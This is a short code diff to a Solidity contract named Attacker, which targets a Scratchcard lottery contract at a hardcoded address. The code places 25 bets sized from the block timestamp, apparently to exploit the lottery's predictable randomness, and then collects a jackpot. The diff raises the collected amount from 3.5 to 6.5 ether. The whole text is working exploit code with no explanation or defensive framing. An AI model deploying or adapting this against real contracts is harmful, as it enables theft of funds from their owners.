@@ -8,7 +8,7 @@ contract Attacker{
         Scratchcard target = Scratchcard(0x505d51adcccb62cd33579c1ea7b94a717f7ae06e);
         for(uint i=0;i<25;i++)
             target.play.value((now%10**8)*10**10)();
-        target.collectMegaJackpot(3.5 ether);
+        target.collectMegaJackpot(6.5 ether);
     }
     
     function () public payable{}
